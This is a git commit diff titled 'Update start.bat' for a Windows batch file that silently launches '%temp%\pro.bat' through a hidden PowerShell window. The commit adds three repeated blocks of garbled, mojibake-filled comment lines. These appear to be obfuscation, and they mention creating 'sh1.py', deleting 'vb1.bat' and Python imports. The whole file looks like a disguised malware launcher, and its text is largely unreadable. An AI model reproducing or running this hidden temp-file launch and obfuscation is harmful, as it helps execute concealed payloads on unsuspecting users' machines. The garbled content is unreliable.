28019f227c917187e22801586eec4f3b106a0209
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-14 03:56:08 +0300

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,2 +1,50 @@
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh cd %µé©%  ([µÛ]£.bat
+@REM yÈh :)  ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
+@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]£.b
 @echo off
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh cd %µé©%  ([µÛ]£.bat
+@REM yÈh :)  ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
+@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]£.b
 powershell -WindowStyle Hidden -Command "Start-Process -FilePath \"%temp%\pro.bat\" -WindowStyle Hidden"
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh cd %µé©%  ([µÛ]£.bat
+@REM yÈh :)  ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
+@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]£.b
